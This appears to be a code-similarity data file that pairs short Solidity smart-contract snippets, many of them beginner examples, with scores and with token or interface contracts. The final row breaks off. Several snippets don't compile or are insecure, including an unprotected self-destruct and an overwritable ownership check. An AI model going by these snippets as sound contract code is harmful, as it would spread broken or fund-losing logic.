"contract A {
        uint public total;

        receive() external payable {
            total = address(this).balance;
        }
    }",0.6083797718792491,"contract TeamAddress1 {

    function() external payable {

        revert(""The contract don`t receive ether"");

    } 

}"
"contract Crowdsale {
    MintableToken public token;
    uint256 public someInt;
    [...]

    function Crowdsale (uint256 _constructorArgument){
      someInt = _constructorArgument;
      token   = createTokenContract();
    }

    function createTokenContract() internal returns (MintableToken) 
    {
      return new MintableToken();
    }",0.66293981005413,"contract FaceblockCrowdsale is Crowdsale {
    function FaceblockCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) 
        Crowdsale(_startTime, _endTime, _rate, _wallet)
    {

    }

    function createTokenContract() internal returns (MintableToken) {
        return new FaceblockToken();
    }
}"
"contract StorageMapping {

    struct S {
        mapping(bytes32 => uint) m;
        bytes32[] b;
        
    }

    mapping(bytes32 => S) public sStructs;

}",0.6518460962770352,"contract KernelStorage {
    
    mapping (bytes32 => mapping (bytes32 => address)) public apps;
    bytes32 public recoveryVaultAppId;
}"
"contract Factory {

    function _createRegistry (
        string _name,
        string _symbol
    ) internal returns (address) {
        return new Registry(_name, _symbol);
    }
}",0.6135065428588491,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract Buy is Ownable{
    MyToken my_token;

    function setToken( address _cotract_address ) public onlyOwner{
        my_token = MyToken( _cotract_address );
    }

    function buyPoint( uint _amount ) public{       
        my_token.transfer( owner, _amount );
    }
}",0.6908372826521161,"contract GoldeaBounty is Ownable {
    ERC20 public token;

    function GoldeaBounty(ERC20 _token) public {
        token = _token;
    }

    function transfer(address beneficiary, uint256 amount) onlyOwner public {
        token.transfer(beneficiary, amount);
    }
}"
"contract myContract {
    uint[] public anArray;   



    function elementIndex(uint element) public view returns(uint){
        uint counter;
        for(uint i; i<anArray.length; i++){
            if(anArray[i] == element){
                counter++;
            }
        }
        return counter;
    }
function returnAllElements() public view returns(uint[]){
return anArray;
}}",0.6156848822705503,"contract Token {

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function transfer(address to, uint tokens) public returns (bool success);

  function allowance(address tokenOwner, address spenderContract) public view returns (uint remaining);

}"
"contract MyContract{
    bytes public data = 0x3333;

    function clearData(){
         data = 0x;
    }
}",0.6109797846106414,"contract ERC223 {
    function tokenFallback(address _from, uint _value, bytes _data) public {}
}"
"contract Now {
   uint start;
   uint end;
   function start(){
      start = now;
   } 
   function end(){
      end = now;
   } 
   function getTimeDif() returns(uint){
      return end - start;
   }     
}",0.6457654048195544,"contract FlapLike {
    function kick(uint lot, uint bid) external returns (uint);
    function cage(uint) external;
    function live() external returns (uint);
}"
"contract Router
{

  function funRcv (address addr) public payable
  {
    if (addr != 0x0)
    {
        addr.transfer(msg.value);
    }
  }
}",0.6352463728724871,"contract ERC20 {

    function transferFrom(address from, address to, uint256 value) public returns (bool);

}"
"contract Puzzle {
     address payable public owner ;
     bool public locked ;
     uint public reward ;
     bytes32 public diff ;
     bytes public solution ;


     
     constructor ( ) payable public{
     owner = msg.sender ;
     reward = msg.value ;
     locked = false ;
      
     diff = bytes32 (uint256(11111));
  }

  function () payable external{ 
    if ( msg. sender == owner ){ 
       
       
       require(!locked);
       bool val=owner.send ( reward );
       reward = msg.value ;
    }
    else
    if ( msg . data . length > 0){ 
        require(!locked);
       
          if ( sha256 (msg. data ) < diff ){
             bool val=msg. sender . send ( reward ); 
             solution = msg. data ;
             locked = true ;
       }}}}",0.6199767095005716,"contract Gift
{
    bool closed = false;
    uint unlockTime = 43200;
    address sender;
    address receiver;
 
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.5 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }

    function() public payable { }
}"
"contract EtheremonLite {
    function initMonster(string _monsterName) public;
    function battle() public returns(uint256);
    function getName(address _monsterAddress) public view returns(string);
    function getNumWins(address _monsterAddress) public view returns(uint);
    function getNumLosses(address _monsterAddress) public view returns(uint);
}",0.6747137661923536,"contract ERC20 {
    uint public decimals;
    function allowance(address, address) public view returns (uint);
    function balanceOf(address) public view returns (uint);
    function approve(address, uint) public;
    function transfer(address, uint) public returns (bool);
    function transferFrom(address, address, uint) public returns (bool);
}"
"contract A_int
{
    event called(string str,uint ts,address addr,string tr);
    function callme(address addr,uint ts,string tr)
    {
        called(""called me"",ts,addr,tr);
    }
    function kill()
        { 
        suicide(msg.sender);
        }
}",0.6191740544907272,"contract AssetStorage {
    function addTrustedIssuer(address addr, string name);
    function removeTrustedIssuer(address addr, string name);
    function assertFact(uint id, string fact);
}"
"contract dog is animal {
...
}",0.6611566397828288,contract Gold is ERC20 {}
"contract B is A {
myVar = 2
}",0.6015336071021374,"contract A {

    B public myB = new B();

}"
"contract Factory {
    function createContract () returns (address){
        address newContract = new test(msg.sender);
        return newContract;
    } 
}",0.6460144231113715,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract test {
 address public creator;
    function test (address _creator){
    creator=_creator;
    }
}",0.6710535996415931,"contract WhiteList {

    function checkAddress ( address _address ) constant public returns(bool);

}"
"contract Math{
    function Math(){}

    function addition(uint256 a, uint256b) returns (uint256){
        return a+b;
    }
}",0.6641555133694637,"contract Counter {
  uint i=1;
  function inc() {
    i=i+1;
  }
  function get() constant returns (uint) {
    return i;
  }
}"
"contract Ownable {

    mapping (address => bool) public authorizedContractAdresses;

    function addContractAdresses(address _address) 
        public
    {
        authorizedContractAdresses[_address] = true;
    }
}",0.6807304142744761,"contract NEST_ToLoanDataContract {

    

    function addContractAddress(address contractAddress) public;

    

    function checkContract(address contractAddress) public view returns (bool);

}"
"contract test{
    string data;
    function getData() view external returns(string memory){
    return data;
    }
    function setData(string calldata _data) external{
    data = _data;
    }
}",0.6447263185257815,"contract onchain{

    string onChainData;

    function set (string x) public{

        onChainData = x;

    }

    

    function get() public constant returns (string){

        return onChainData;

    }

}"
"contract Main{
   
   mapping(address => address[]) public dynamic_contracts;
   function createContract(){
      address newContract = new Dynamic(msg.sender);
      dynamic_contracts[msg.sender].push(newContract);
   }
}",0.6120573994634716,"contract NEST_ToLoanDataContract {

    

    function addContractAddress(address contractAddress) public;

    

    function checkContract(address contractAddress) public view returns (bool);

}"
"contract HelloUniverse is HelloWorld{
...
}",0.6010807075223354,"contract Hello {

    function Hello() {

    }
}"
"contract shapeCalculator {
    function rectangle(uint w,uint h)
    returns (uint s, uint p )
    {
    s=w*h;
    p=2*(w+h);
    }
}",0.644046631628778,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract TestAuction {

}",0.6729864884660303,contract Test {}
"contract CompanyRole {

    mapping(address => address) public directors;
}",0.6586988250178901,"contract Casino {

    mapping(address => bool) public authorized;

}"
"contract testCompile{
        string myString = ""Hello World"";

        function showString() public view returns (string memory){
            return myString;
        }        
    }",0.6588746232485395,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract testcontract {
    function testme () returns (string){
        string mystring = ""foo2"";
        return ""foo"";
    }
}",0.6966610506509912,"contract testContract {    
   function go() constant returns (string) {        
      return ""Hello Ethereum!"";    
   }
}"
"contract Test
{
    function encode(uint256 a, string calldata b) external pure returns(string memory)
    {
        return string(abi.encode(a, b));
    }
    function decode(string calldata a) external pure returns(uint256, string memory)
    {
        return abi.decode(bytes(a), (uint256, string));
    }
}",0.6586540497187571,"contract IFulcrum {
    function tokenAddresses(uint256 i) external view returns(address);

    function tokens(address _token)
        external
        view
        returns(
            address token,
            address asset, 
            string memory name,
            string memory symbol,
            uint256 tokenType, 
            uint256 index
        );
}"
"contract SimpleTest {
    int public count;

    function IncCounter()
    {
        count++;
    }

    function GetCounter() constant returns(int)
    {
        return count;
    }
}",0.6894060601296468,"contract Oracle {

    function isOutcomeSet() public constant returns (bool);
    function getOutcome() public constant returns (int);
}"
"contract Company{

struct Stock{
    address owner;
    string bitcoinAddress;
}

string public companyName;
Stock[2] public owners;
string public test;

function Company(string _companyName, address[2] addresses){
    companyName = _companyName;
    for(uint8 x=0; x<owners.length; x++){
        owners[x] = Stock(addresses[x], """");
    }
 }

function changeStockOwner(uint8 _number, address _newAddress) constant returns(string){
    if(msg.sender == owners[_number].owner){
        owners[_number].owner = _newAddress;
        test = ""hello"";
        return ""well"";
    }
}
}",0.6073770618489034,"contract TES is StandardToken{
    string public constant name = ""TokensExchangeSystem"";
    string public constant symbol = ""TES"";
    uint public constant decimals = 18;
    string public constant version = ""1.0"";
    address public owner;
    modifier onlyOwner{
      if(msg.sender != owner) throw;
      _;
    } 
    function TES(){
        owner = msg.sender;
        totalSupply = 10*(10**8)*(10**decimals);
        balances[owner] =  totalSupply;
    }

    function changeOwner(address newOwner) onlyOwner{
      owner = newOwner;
    }

    
    function () payable{
        throw;
    }
}"
"contract store{
    event MoneyIn (address _from, uint256 _amount);

    function getMoney() payable{
        
        MoneyIn(msg.sender, msg.value);
    } 
}",0.6391604111180778,"contract Migratable {
    function migrate(address user, uint256 amount, address tokenAddr) external payable returns (bool);
}"
"contract User {

    mapping(uint=>address) addresses;
    uint addressRegistryCount;   
}",0.6261459669690299,"contract IAddressList {
    mapping (address => bool) public listedAddresses;
}"
"contract Goldbar 
{
  address public creator;
  mapping (address=>uint)  public balance ;

  function Goldbar()
  {
      creator = msg.sender;
  }

  event delivered(addressfrom, address to, uint amount) 


function transfer(address receiver,uint amount)
{
    if(balance[msg.sender] <amount)throw ;
    balance[msg.sender]  -=amount;
    balance[msg.reciver] +=amount;
    delivered(msg.sender,receiver,amount);
}


}",0.6795363973545079,"contract VariableSupplyToken is ERC20x {

    function grant(address to, uint256 amount) public {

        require(msg.sender == creator);

        require(balances[to] + amount >= amount);

        balances[to] += amount;

        totalSupply += amount;

    }



    function burn(address from, uint amount) public {

        require(msg.sender == creator);

        require(balances[from] >= amount);

        balances[from] -= amount;

        totalSupply -= amount;

    }

}"
"contract AddressBook {

    uint public val = 1000;
    address[] public addresses;

}",0.6628200785528304,"contract Deed {
    address public owner;
    address public previousOwner;
}"
"contract SimpleToken {
    address client;
    uint256 public totalSupply;
    uint remaining;
    uint price;

uint ethval;

mapping (address => uint) investors;
event testDebug(string _msg,address client,uint256 totalSupply,uint receivedValue);
function SimpleToken(uint _totalSupply) 
{
    client = msg.sender;
    totalSupply = _totalSupply;
    remaining = 0;
}

function setEthValue(uint _value){
    ethval = _value;
}

function sendToken() payable 
{
    testDebug(""Before"",client,totalSupply,investors[msg.sender]);
    assert(remaining < totalSupply);
    uint noOfTokens = ethval/price;
    assert(noOfTokens < totalSupply-remaining); 
    investors[msg.sender] = noOfTokens;
    remaining = remaining+noOfTokens;

    testDebug(""After"",client,remaining,noOfTokens);

    client.transfer(noOfTokens);

}

function setTokenPrice(uint _price)
{ 
    price = _price;
}

function getEthVal() constant returns(uint){
    return ethval;
}
}",0.6099433583377034,"contract SAFETYToken is StandardToken {

  using SafeMath for uint256;

  

  string constant public name = ""Super AI Feasibility Technology"";

  string constant public symbol = ""SAFETY"";

  uint8 constant public decimals = 18;

  uint public totalSupply = 100*10**26;



  event PaymentReceived(address _from, uint256 _amount);



  constructor(address _wallet) public {

    balances[_wallet] = totalSupply;

    emit Transfer(address(0), _wallet, totalSupply);

  }



  function burn(uint256 _value) public returns (bool) 

  {

    require(balances[msg.sender] >= _value);

    balances[msg.sender] = balances[msg.sender].sub(_value);

    totalSupply = totalSupply.sub(_value);

    emit Burn(msg.sender, _value);

    return true;

  }

  

  function withdrawEther(uint256 _amount) public onlyOwner {

    owner.transfer(_amount);

  }



  function () external payable {

    emit PaymentReceived(msg.sender, msg.value);

  }

}"
"contract Hello {
    
    string public constant aString = 'Hello World!';

    
    function printMe() returns (string){
        return aString;
    }
}",0.6524807257653861,"contract MyContract {
  string word = ""All men are created equal!"";

  function getWord() returns (string){
    return word;
  }

}"
"contract Goodbye is Hello{
    
    string public constant aString = 'Goodbye World!';

    
    function printMe() returns (string){
        return super.printMe();
    }

    
    function printMe2() returns (string){
        return aString;
    }
}",0.668678030670954,"contract HelloWorld {
    
    string wellcomeString = ""Hello, world!"";
    
    function getData() public constant returns (string) {
        return wellcomeString;
    }
    
    function setData(string newData) public {
        wellcomeString = newData;
    }
    
}"
"contract TestContract
{
    bytes32 recorded_value;
    bytes32 recorded_salt; 

    function TestContract(bytes32 value, bytes32 salt) public
    {
        recorded_value = value;
    }

    function getHash() public constant
        returns (bytes32)
    {
        return keccak256(recorded_value);
    }
}",0.602012995804002,"contract Example is Upgradeable {
    uint _value;
    
    function initialize() public {
        _sizes[bytes4(keccak256(""getUint()""))] = 32;
    }
    
    function getUint() public view returns (uint) {
        return _value;
    }
    
    function setUint(uint value) public {
        _value = value;
    }
}"
"contract Test {

    address public scAddress; 
    address public lastSCAddress; 

}",0.6839086382591639,"contract Deed {
    address public owner;
    address public previousOwner;
}"
"contract SimpleCatalog{
    bytes32[] internal x;

    constructor () public{
      x.push(0xa);
      x.push(0xb);
      x.push(0xc);
    }

    function getX() external view returns (bytes32[]){
      return x;
    }
}",0.645948178984598,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract MultiSignatureWallet {



  uint constant public MAX_OWNER_COUNT = 2; 

  event Confirmation(address indexed sender, uint indexed transactionId);
  event Revocation(address indexed sender, uint indexed transactionId);
  event Submission(uint indexed transactionId);
  event Execution(uint indexed transactionId);
  event ExecutionFailure(uint indexed transactionId);
  event Deposit(address indexed owner);
  event RequirementChange(uint required);

   mapping (uint => Transaction) public transactions;
   mapping (uint => mapping(address => bool)) public confirmations;
   mapping (address => bool) public isOwner;
   address[] public owners;
   uint public required;
   uint public transactionCount;

      struct Transaction {
        address destination;
        uint value;
        bytes data;
        bool executed;
      }



  modifier onlyWallet() {
      if (msg.sender !=address(this))
          revert();
      _;
  }

  modifier ownerDoesNotExist(address owner) {
      if (isOwner[owner])
      revert();
      _;
  }

  modifier confirmed(uint transactionId, address owner) {
      if (!confirmations[transactionId] [owner])
      revert();
      _;
  }

  modifier notConfirmed(uint transactionId, address owner) {
      if (confirmations[transactionId][owner])
      revert();
      _;
  }

  modifier notExecuted(uint transactionId) {
      if (transactions[transactionId].executed)
      revert();
      _;
  }

  modifier notNull(address _address) {
      if (_address == address(0))
          revert();
      _;
  }

  modifier  validRequirement( uint ownerCount, uint _required) {
      if (  _required > ownerCount
          ||  _required == 0
          ||  ownerCount   == 0)
          revert();
          _;
        }






    
    
    
    
    function MultiSigWallet(address[] memory _owners, uint _required)
          public
          validRequirement(_owners.length, _required)
      {
          for (uint i=0; i<_owners.length; i++) {
            if (isOwner[_owners[i]] || _owners[i] == address (0))
              revert();
            isOwner[_owners[i]] = true;
          }
          owners = _owners;
          required = _required;
      }

    
    
    
    
    
    function submitTransaction(address destination, uint value, bytes
    memory data)
    public
    returns (uint transactionId)
  {
    require(isOwner[msg.sender]);
    transactionId = addTransaction(destination, value, data);
    confirmTransaction(transactionId);
  }

    
    
    function confirmTransaction(uint transactionId)
    public
  {
     require(isOwner[msg.sender]);
     require(transactions[transactionId].destination != address (0));
     require(confirmations[transactionId][msg.sender] == false);
     confirmations[transactionId][msg.sender] = true;
     executeTransaction(transactionId);
  }

    
    
    function revokeConfirmation(uint transactionId)
    public
 {
    require(transactions[transactionId].executed == false);
 }

    
    
    function executeTransaction(uint transactionId)
    public
{
    require(transactions[transactionId].executed == false);
    if (isConfirmed(transactionId)) {
      Transaction storage t  = transactions[transactionId];
      t.executed = true;
      (bool success, bytes memory data) =
      t.destination.call.value(t.value)(t.data);
      if (success)
          emit Execution(transactionId);
      else {
          emit ExecutionFailure(transactionId);
          t.executed = false;
      }
}
}
        
    
    
    
    function isConfirmed(uint transactionId) 
    public
    view
    returns (bool)
  {
    uint count = 0;
     for(uint i=0; i<owners.length; i++) {
        if (confirmations[transactionId][owners[i]])
            count += 1;
        if (count == required)
            return true;
  }
}
    
    
    
    
    
    function addTransaction(address destination, uint value, bytes memory data)
    internal
    returns (uint transactionId)
  {
    transactionId = transactionCount;
    transactions[transactionId] = Transaction({
      destination: destination,
      value: value,
      data: data,
      executed: false
    });
    transactionCount +=1;
    emit Submission(transactionId);
  }
}",0.6096980247408901,"contract IOD is ERC20 {



    using SafeMath for uint256;

    address public owner;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;



    string public constant name = ""IOD Token"";

    string public constant symbol = ""IOD"";

    string public version  = ""v.0.1"";

    uint public constant decimals = 8;



    uint256 public maxSupply = 13000000000e8;

    uint256 public constant minContrib = 1 ether / 100;

    uint256 public IODPerEther = 15000000e8;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Burn(address indexed burner, uint256 value);

    constructor () public {

        totalSupply = maxSupply;

        balances[msg.sender] = maxSupply;

        owner = msg.sender;

    }

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function () public payable {

        buyIOD();

     }



    function dividend(uint256 _amount) internal view returns (uint256){

        if(_amount >= IODPerEther.div(2) && _amount < IODPerEther){ return ((20*_amount).div(100)).add(_amount);}

        else if(_amount >= IODPerEther && _amount < IODPerEther.mul(5)){return ((40*_amount).div(100)).add(_amount);}

        else if(_amount >= IODPerEther.mul(5)){return ((70*_amount).div(100)).add(_amount);}

        return _amount;

    }



    function buyIOD() payable public {

        address investor = msg.sender;

        uint256 tokenAmt =  IODPerEther.mul(msg.value) / 1 ether;

        require(msg.value >= minContrib && msg.value > 0);

        tokenAmt = dividend(tokenAmt);

        require(balances[owner] >= tokenAmt);

        balances[owner] -= tokenAmt;

        balances[investor] += tokenAmt;

        emit Transfer(this, investor, tokenAmt);

    }



    function balanceOf(address _owner) constant public returns (uint256) {

        return balances[_owner];

    }



    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }



    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

    }

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(_from, _to, _amount);

        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }



    function transferOwnership(address _newOwner) onlyOwner public {

        if (_newOwner != address(0)) {

            owner = _newOwner;

        }

    }



    function withdrawFund() onlyOwner public {

        address thisCont = this;

        uint256 ethBal = thisCont.balance;

        owner.transfer(ethBal);

    }



    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);

        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        emit Burn(burner, _value);

    }



}"
"contract StorageMapping {

    struct S {
        mapping(bytes32 => uint) m;
        bytes32[] b;
        uint x;
    }

    mapping(bytes32 => S) public sStructs;

}",0.6305444347475249,"contract KernelStorage {
    
    mapping (bytes32 => mapping (bytes32 => address)) public apps;
    bytes32 public recoveryVaultAppId;
}"
"contract Purchase {

 address public buyer;
 address public seller;
 address public companyEscrow;
 uint private moneyInEscrow = 0;

 modifier onlyCompanyEscrow {
    require(
        msg.sender == companyEscrow,
        ""Only the escrow account of the company can call this function.""
    );
    _;
 }

 modifier onlyBuyer {
    require(
        msg.sender == buyer,
        ""Only the buyer can call this function.""
    );
    _;
 }

 constructor (address addressSeller, address addressCompanyEscrow) public payable {
    buyer = msg.sender;
    seller = addressSeller;
    companyEscrow = addressCompanyEscrow;
 }

 function sendFundsToCompany ()
      public
      payable
      onlyBuyer
      returns (bool completed)
  {
      moneyInEscrow = msg.value;
      companyEscrow.transfer(moneyInEscrow);
      return true;
  }


  function sendFundsToSeller ()
      public
      payable
      onlyCompanyEscrow
      returns (bool completed)
  {
      seller.transfer(moneyInEscrow);
      moneyInEscrow = 0;
      return true;
  }
}",0.6273217432308714,"contract MobaBase {

    address public owner = 0x0;

    bool public isLock = false;

    constructor ()  public  {

        owner = msg.sender;

    }

    

    event transferToOwnerEvent(uint256 price);

    

    modifier onlyOwner {

        require(msg.sender == owner,""only owner can call this function"");

        _;

    }

    

    modifier notLock {

        require(isLock == false,""contract current is lock status"");

        _;

    }

    

    modifier msgSendFilter() {

        address addr = msg.sender;

        uint size;

        assembly { size := extcodesize(addr) }

        require(size <= 0,""address must is not contract"");

        require(msg.sender == tx.origin, ""msg.sender must equipt tx.origin"");

        _;

    }

    

    function isNotContract(address addr) returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        require(size <= 0,""address must is not contract"");

        

        if(size <= 0)

            return true;

        return false;

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }



}"
"contract Contract {
    function hashIt(string a, uint b) returns(bytes32){
        return sha3(a, b);
    }
}",0.6873895290696335,"contract testContract {    
   function go() constant returns (string) {        
      return ""Hello Ethereum!"";    
   }
}"
"contract AbstractB {
    function getX() returns(uint);
}",0.6746275320982554,"contract Fees {

    function GetFeeDATM()returns(uint);

}"
"contract Caller is Callee{

    
    
    
    
    function someAction() public returns(uint){
      return getValue();
    }
    function inc() public returns(uint){
      return increment();
    }

}",0.6753331761637498,"contract Coin {

    function getOwner(uint index) public view returns (address, uint256);

    function getOwnerCount() public view returns (uint);

}"
"contract TestContract{

    uint testUint;

    function testFunc() public view returns(uint[]){
        uint[] memory testArr = new uint[](1);
        testArr[0]++;   
        testUint++;     
        return testArr;
    }    
}",0.6065752354851218,"contract OldToken is IERC721 {

    function getCard(uint id) public view returns (uint16, uint16);
    function totalSupply() public view returns (uint);

}"
"contract customer{
  address payable[]  public onboarded;
  bytes public fullname;
  bytes public id;
  bool public KYC;
  uint256 public categor;
  function prime(bytes memory fname, bytes memory iden, bool KYCresult, uint256 level, address payable bank) public{
    fullname=fname;
    id=iden;
    KYC=KYCresult;
    categor=level;
    onboarded.push(bank);
  }
  function() external payable{}
  }",0.6062048943778363,"contract TokenI is ERC20Token {



    string public name;                

    uint8 public decimals;             

    string public symbol;              



    function approveAndCall(

    address _spender,

    uint256 _amount,

    bytes _extraData

    ) public returns (bool success);





    function generateTokens(address _owner, uint _amount) public returns (bool);



    function destroyTokens(address _owner, uint _amount) public returns (bool);



}"
"contract SoloMargin {
        struct OperatorArg {
            address operator;
            bool trusted;
        }

        function operate(Account.Info[] memory accounts, Actions.ActionArgs[] memory actions) public;
        function getAccountWei(Account.Info memory account, uint256 marketId) public view returns (Types.Wei memory);
        function setOperators(OperatorArg[] memory args) public;

        function getMarketTokenAddress(
            uint256 marketId
        )
            public
            view
            returns (address);

        function getIsLocalOperator(
            address owner,
            address operator
        )
            public
            view
            returns (bool);
    }",0.655284304796147,"contract DSPauseAbstract {
    function setOwner(address) public;
    
    function setAuthority(address) public;
    function setDelay(uint256) public;
    
    function plans(bytes32) public view returns (bool);
    
    function proxy() public view returns (address);
    
    function delay() public view returns (uint256);
    function plot(address, bytes32, bytes memory, uint256) public;
    function drop(address, bytes32, bytes memory, uint256) public;
    function exec(address, bytes32, bytes memory, uint256) public returns (bytes memory);
}"
"contract SoloTest
    {
        address sm; 

        Account.Info[] accounts;
        Actions.ActionArgs[] actions;

        constructor(address soloMargin) public {
            sm = soloMargin;
        }

        function operate(Account.Info memory account, uint amount, uint market, bool isDeposit) public
        {
            bytes memory data;

            Actions.ActionArgs memory action = Actions.ActionArgs({
                actionType: isDeposit ? Actions.ActionType.Deposit : Actions.ActionType.Withdraw,
                amount: Types.AssetAmount({
                    sign: isDeposit,
                    denomination: Types.AssetDenomination.Wei,
                    ref: Types.AssetReference.Delta,
                    value: amount
                }),
                primaryMarketId: market,
                otherAddress: msg.sender,
                accountId: 0,
                secondaryMarketId: 0,
                otherAccountId: 0,
                data: data
            });

            if (accounts.length > 0) {
                accounts[0] = account;
                actions[0] = action;
            } else {
                accounts.push(account);
                actions.push(action);
            }

            SoloMargin(sm).operate(accounts, actions);
        }
    }",0.6995346463291547,"contract SoloMarginContract {

    struct Info {
        address owner;  
        uint256 number; 
    }

    enum ActionType {
        Deposit,   
        Withdraw,  
        Transfer,  
        Buy,       
        Sell,      
        Trade,     
        Liquidate, 
        Vaporize,  
        Call       
    }

    enum AssetDenomination {
        Wei, 
        Par  
    }

    enum AssetReference {
        Delta, 
        Target 
    }

    struct AssetAmount {
        bool sign; 
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }

    struct Wei {
        bool sign; 
        uint256 value;
    }

    function operate(Info[] memory accounts, ActionArgs[] memory actions) public;
    function getAccountWei(Info memory account, uint256 marketId) public returns (Wei memory);

}"
"contract SimpleContractTest {
    event ReturnValue(address _from, uint256 _value);
    function SimpleContractTest()
    payable
    {

    }
    function myBalanceConstant() constant returns (uint256 amount)
    {
      return msg.sender.balance;
    }
    function contractBalanceConstant() constant returns (uint256 amount)
    {
      return this.balance;
    }
    function myBalancePublic() public returns (uint256 amount)
    {
      ReturnValue(msg.sender, msg.sender.balance);
      return msg.sender.balance;
    }
    function contractBalancePublic() public returns (uint256 amount)
    {
      ReturnValue(msg.sender, msg.sender.balance);
      return this.balance;
    }
}",0.6491743980453022,"contract ERC20BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;

  uint256 public totalSupply;



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));



    

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public constant returns (uint256 balance) {

    return balances[_owner];

  }



  function totalSupply() constant returns (uint256 _totalSupply) {

    return totalSupply;

  }



}"
"contract Genobject{
uint public item;
function Genobject(uint _val){
    item=_val;}
}",0.6396723726024603,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
}"
"contract Caller{
   Genobject public instance;
   function Caller(){
       instance= new Genobject(3);
   }
   function Recall() returns (uint){
      return Genobject.item; }
}",0.6143491408982111,"contract PriceFeedInterface {

    function name() public view returns (string);

    function getRate() public view returns (uint _rate, bool _live);

}"
"contract Tester {

    function loo() public pure returns(string memory){
        uint i = 1;
        uint c = 0;
        while(i == 1){
            c = c + 1;
        }
        return ""good"";
    }
}",0.6544946532152504,"contract testabi {

    uint c;

    function tinhtong(uint a, uint b) public {

        c = a+b;

    } 

    function ketqua() public view returns (uint) {

        return c;

    }

}"
"contract Process{
address public owner;
uint balance;
uint amount;

function Process(){
    owner = msg.sender;
    balance = 1000;
}

 event DepositMade(string msg);
 event WithdrawalMade(string msg);

 function deposit(uint amot){
    balance = balance + amot;
    DepositMade(""Deposit is done"");
}

function getBalance()constant returns (uint){
    return balance;   
}

function withdraw(uint amot)returns (bool){
    if(amot > balance){
        return false;
    }
    else{
        balance = balance - amot;
        WithdrawalMade(""Withdrawal is done"");
        return true;
    }
}",0.6502222682664711,"contract BasicToken is ERC20Basic {
    using SafeMath for uint256;

  
    mapping(address => uint256) balances;

  
    function transfer(address _to, uint256 _amount) public returns (bool) {
        require(_to != address(0));
        require(balances[msg.sender] >= _amount && _amount > 0 && balances[_to].add(_amount) > balances[_to]);

        
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

  
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

}"
"contract Test
{

    function sendEther(address toAddr) public payable
    {
        toAddr.transfer(msg.value);
    }
}",0.6654265687811732,"contract Token {
  function transfer(address to, uint value) public returns (bool);
}"
"contract PayCheck {

    address[] employees = [0xE83fad0b5EdF2999c29a00199Ca9B773A4627239, 0x118531D9C6C9114c8B999Ac1197778d1669Fc6c6];

    mapping (address => uint) withdrawnAmounts;

    constructor() payable public{
    }

    function () payable public{
    }

    modifier canWithdraw() {
        bool contains = false;

        for(uint i = 0; i < employees.length; i++) {
            if(employees[i] == msg.sender) {
                contains = true;
            }
        }
        require(contains);
        _;
    }

    function withdraw() canWithdraw public{
        uint amountAllocated = address(this).balance/employees.length;
        uint amountWithdrawn = withdrawnAmounts[msg.sender];
        uint amount = amountAllocated - amountWithdrawn;
        withdrawnAmounts[msg.sender] = amountWithdrawn + amount;
        if (amount > 0) {
            msg.sender.transfer(amount);
        }

    }

}",0.6065922518774277,"contract BonusHolder is Pausable {

